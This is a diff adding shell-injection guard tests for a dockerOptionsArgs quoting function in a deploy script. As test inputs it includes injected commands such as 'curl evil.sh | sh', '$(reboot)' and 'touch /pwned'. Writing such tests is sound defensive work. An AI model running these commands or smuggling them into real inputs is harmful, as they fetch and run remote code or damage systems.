@@ -28,6 +28,7 @@ import {
   staticDockerfile,
   staticNginxConf,
   traefikLabels,
+  dockerOptionsArgs,
   type AppSpec,
 } from "./deploy-script";
 
@@ -38,6 +39,56 @@ const base: AppSpec = {
   hostPort: null,
   containerPort: 80,
 };
+
+describe("dockerOptionsArgs (shell-injection guard)", () => {
+  it("preserves legitimate flags as separate shell-quoted argv tokens", () => {
+    expect(dockerOptionsArgs("--cap-add=NET_ADMIN --pids-limit 100")).toBe("'--cap-add=NET_ADMIN' '--pids-limit' '100'");
+  });
+
+  it("keeps a quoted value with spaces as ONE token", () => {
+    expect(dockerOptionsArgs('--label foo="bar baz"')).toBe("'--label' 'foo=bar baz'");
+    expect(dockerOptionsArgs("--label foo='bar baz'")).toBe("'--label' 'foo=bar baz'");
+  });
+
+  it("NEUTRALIZES shell injection — metacharacters become literal argv, never execute", () => {
+    const out = dockerOptionsArgs("--name x; curl evil.sh | sh");
+    // each word is single-quoted; the shell sees no operators
+    expect(out).toBe("'--name' 'x;' 'curl' 'evil.sh' '|' 'sh'");
+    expect(out).not.toMatch(/[^']\|[^']/); // no bare pipe
+    expect(out).not.toContain("; curl"); // no bare command separator
+  });
+
+  it("neutralizes command substitution — becomes a literal argv token", () => {
+    expect(dockerOptionsArgs("$(reboot)")).toBe("'$(reboot)'");
+    expect(dockerOptionsArgs("`reboot`")).toBe("'`reboot`'");
+  });
+
+  it("a single quote inside a double-quoted value is escaped by shq (no quote breakout)", () => {
+    // input value contains a literal ' — shq must escape it so it can't break out of the quoting
+    expect(dockerOptionsArgs('--label x="a\'b"')).toBe("'--label' 'x=a'\\''b'");
+  });
+
+  it("a stray unbalanced single quote fails closed (like a real shell), never executes", () => {
+    expect(() => dockerOptionsArgs("a'b")).toThrow(/unterminated quote/);
+  });
+
+  it("empty / whitespace / null → empty string", () => {
+    expect(dockerOptionsArgs(null)).toBe("");
+    expect(dockerOptionsArgs(undefined)).toBe("");
+    expect(dockerOptionsArgs("   ")).toBe("");
+  });
+
+  it("throws on an unterminated quote (fail closed)", () => {
+    expect(() => dockerOptionsArgs('--label "oops')).toThrow(/unterminated quote/);
+    expect(() => dockerOptionsArgs("--label 'oops")).toThrow(/unterminated quote/);
+  });
+
+  it("the built run command embeds the quoted opts, never the raw injection", () => {
+    const s = buildRunScript({ ...base, dockerOptions: "--name x; touch /pwned" } as AppSpec, "v1");
+    expect(s).toContain("'--name' 'x;' 'touch' '/pwned'");
+    expect(s).not.toContain("x; touch /pwned"); // raw injection string is NOT present unquoted
+  });
+});
 
 describe("digest pin", () => {
   it("an IMAGE deploy resolves + echoes the upstream digest right after pull", () => {
@@ -308,9 +359,9 @@ describe("deploy-script", () => {
     expect(s).not.toContain("--env ");
   });
 
-  it("appends custom docker options to docker run verbatim", () => {
+  it("appends custom docker options as shell-quoted argv (not verbatim — injection guard)", () => {
     const s = buildRunScript({ ...base, dockerOptions: "--cap-add=NET_ADMIN --dns 1.1.1.1" }, "v1");
-    expect(s).toContain("--cap-add=NET_ADMIN --dns 1.1.1.1");
+    expect(s).toContain("'--cap-add=NET_ADMIN' '--dns' '1.1.1.1'");
     expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped");
   });
 
